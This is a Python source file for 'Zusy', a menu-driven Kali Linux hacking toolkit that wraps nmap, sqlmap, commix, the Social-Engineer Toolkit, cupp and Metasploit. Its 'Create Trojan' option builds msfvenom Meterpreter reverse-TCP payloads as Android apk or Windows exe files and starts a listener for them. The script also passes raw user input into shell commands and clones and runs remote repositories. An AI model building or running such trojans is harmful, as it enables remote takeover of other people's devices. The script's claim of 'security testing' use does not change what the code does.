from subprocess import run, PIPE
import os
import signal
from colorama import Fore

def signal_handler(sig, frame):
    print("")
    print("")
    print("Thanks for using!!!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)


def clear_screen():
    os.system('clear')

def get_kali_ip():
    process = run("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1", shell=True, stdout=PIPE, text=True)
    if process.returncode == 0:
        return process.stdout.strip()
    else:
        return None

def create_trojan():
    clear_screen()
    print("[0] Back\n")
    print("[1] Android")
    print("[2] Windows")
    
    platform_choice = input("Which operating system do you want to create for? (1/2): ")
    
    if platform_choice == "0":
        main_menu()
    
    platform = ""
    file_extension = ""
    
    if platform_choice == "1":
        platform = "android"
        file_extension = "apk"
    elif platform_choice == "2":
        platform = "windows"
        file_extension = "exe"
    else:
        print("Invalid choice.")
        create_trojan()
    
    clear_screen()
    lhost = input("LHOST = ")
    if not lhost:
        lhost = get_kali_ip()
        if not lhost:
            print("Failed to get Kali Linux IP address.")
            input("\nPress Enter to back...")
            main_menu()
    
    lport = input("LPORT = ")
    
    filedirectory = input("Please enter the file name: ")
    clear_screen()
    
    trojan_command = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filedirectory}.{file_extension}"
    
    print("Please wait...")
                    
    process = run(trojan_command, shell=True)
    if process.returncode == 0:
        print(f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
        print("Starting Metasploit...")
        msf_command = f"use exploit/multi/handler; set payload {platform}/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4242; exploit"
        run(f"msfconsole -q -x '{msf_command}'", shell=True)
    else:
        print("Trojan creation failed.")
        
    input("\nPress Enter to continue...")
    main_menu()


def ip_tracer():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Enter IP Address: ")
    if target_ip == "0":
        main_menu()
    
    if not target_ip:
        print("\033[91mError: Please enter a valid IP address\033[0m")
        input("\nPress Enter to go back...")
        main_menu()
        return
    
    ip_tracer_command = f"curl ipinfo.io/{target_ip}"
    print("Please wait...")
    process = run(ip_tracer_command, shell=True, capture_output=True, text=True)
    if process.stdout is not None:
        print(process.stdout)
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()

def nmap_scan():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target IP: ")
    if target_ip == "0":
        main_menu()
        return
    nmap_command = f"nmap -p1-65535 -sV -sS -T4 -A -O {target_ip}"
    print("Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("Nmap scan completed.")
    input("\nPress Enter to go back...")
    main_menu()

def port_scan():
    clear_screen()
    port_scancommand = "python3 portscan.py"
    print("Please Wait")
    process = run(port_scancommand, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")    
        print("Port scan completed.")
    input("\nPress Enter to go back...")
    main_menu() 

def netdiscover():
    clear_screen()
    netdiscover_command = "netdiscover"
    print("Please Wait")
    process = run(netdiscover_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()
    
    

def sql_scan():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target Web Site Link: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"sqlmap -u {target_ip}"
    print("Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("Scan completed.")
    input("\nPress Enter to go back...")
    main_menu()

def commix_scan():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target Web Site Link: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"commix -u {target_ip}"
    print("Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("Scan completed.")
    input("\nPress Enter to go back...")
    main_menu()
    
def info():
    clear_screen()
    print("Credits : No_Name.exe (Zusy)")
    print("")
    print("This tool is made for security testing and cybersecurity! We are not responsible for malicious use!")
    print("")
    print("by Offensive Secuirty and No_Name.exe")
    print("")
    print("Github : " + Fore.BLUE + "https://github.com/NoNameZusy/" + Fore.WHITE)
    print("")
    print("Youtube : " + Fore.BLUE + "https://www.youtube.com/channel/UCql2YVKt-wF1LFuxhAthcaQ" + Fore.WHITE)
    print("")
    print("")
    input("Press Enter to go back...")
    main_menu()

def open_metasploit():
    clear_screen()
    run("msfconsole -q", shell=True)

def cupp_open():
    clear_screen()
    process = run("which cupp", shell=True, capture_output=True, text=True)
    if process.returncode == 0:
        print("")
        run("cupp -i", shell=True)
    else:
        print("Cupp is not installed. Installing...")
        install_command = "sudo apt install cupp"
        process = run(install_command, shell=True)
        if process.returncode == 0:
            print("Cupp installed successfully. Opening...")
            run("cupp -i", shell=True)
        else:
            print("Failed to install Cupp.")
    input("\nPress Enter to go back...")
    main_menu()

def update_kali():
    clear_screen()
    run("sudo apt update && sudo apt upgrade", shell=True)

def ifconfig():
    clear_screen()
    run("ifconfig", shell=True)
    input("\nPress Enter to go back...")
    main_menu()

def kali_undercover():
    clear_screen()
    run("kali-undercover && python3 OpenZusy.py", shell=True)

def update_tool():
    try:
        print("Updating tool...")
        run("cd .. && rm -rf Zusy && git clone https://github.com/NoNameZusy/Zusy.git && cd Zusy && python3 OpenZusy.py", shell=True)
    except Exception as e:
        print("Error updating tool:", e)
        main_menu()

def reboot_system():
    clear_screen()
    input("Press Enter to continue...")
    run("sudo reboot", shell=True)

def threat_manager():
    if os.path.isdir("ThreatManager"):
        run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/ThreatManager.git", shell=True)
        run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
        
def No_Escape():
    if os.path.isdir("No_Escape"):
        run("cd .. && cd No_Escape && python3 No_Escape.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/No_Escape.git", shell=True)
        run("cd .. && cd No_Escape && python3 No_Escape.py", shell=True)        
        
def wifi_scan():
    clear_screen()
    port_scancommand = "python3 find.py"
    process = run(port_scancommand, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")    
        print("Wifi scan completed.")
    input("\nPress Enter to go back...")
    main_menu() 
        

def social_engineering():
    clear_screen()
    run("setoolkit", shell=True)

def InformationManager():
    if os.path.isdir("InformationManager"):
        run("cd .. && cd InformationManager && python3 Information.py", shell=True)
    else:
        run("cd .. && git clone https://github.com/NoNameZusy/InformationManager.git", shell=True)
        run("cd .. && cd InformationManager && python3 Information.py", shell=True)

def main_menu():
    clear_screen()
    logo = """
      ╔════╦╗─╔╦═══╦╗──╔╗
      ╚══╗═║║─║║╔═╗║╚╗╔╝║
      ──╔╝╔╣║─║║╚══╬╗╚╝╔╝
      ─╔╝╔╝║║─║╠══╗║╚╗╔╝─
      ╔╝═╚═╣╚═╝║╚═╝║─║║──
      ╚════╩═══╩═══╝─╚╝──
-------{ By No_Name.exe }-------
                        v 1.6
    """
    print(logo)
    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[99] Exit\n"
    "\n[100] Update\n[101] Info\n")
    choice = input("Zusy ~$ ")
    if choice == "1":
        nmap_scan()
    elif choice == "2":
        open_metasploit()
    elif choice == "3":
        social_engineering()
    elif choice == "4":
        sql_scan()
    elif choice == "5":
        commix_scan()    
    elif choice == "6":
        reboot_system()
    elif choice == "7":
        kali_undercover()  
    elif choice == "8":
        update_kali()   
    elif choice == "9":
        cupp_open() 
    elif choice == "10":
        ifconfig()      
    elif choice == "11":
        create_trojan()   
    elif choice == "12":
        ip_tracer() 
    elif choice == "13":
        netdiscover()   
    elif choice == "14":
        threat_manager()    
    elif choice == "15":
        port_scan() 
    elif choice == "16":
        InformationManager()
    elif choice == "17":
        wifi_scan()
    elif choice == "18":
        No_Escape()                                 
    elif choice == "100":
        update_tool()
    elif choice == "101":
        info()    
    elif choice == "99":
        print("\nThanks for using!!!")
    else:
        print("\nError: Please Try Again")
        main_menu()

if __name__ == "__main__":
    main_menu()
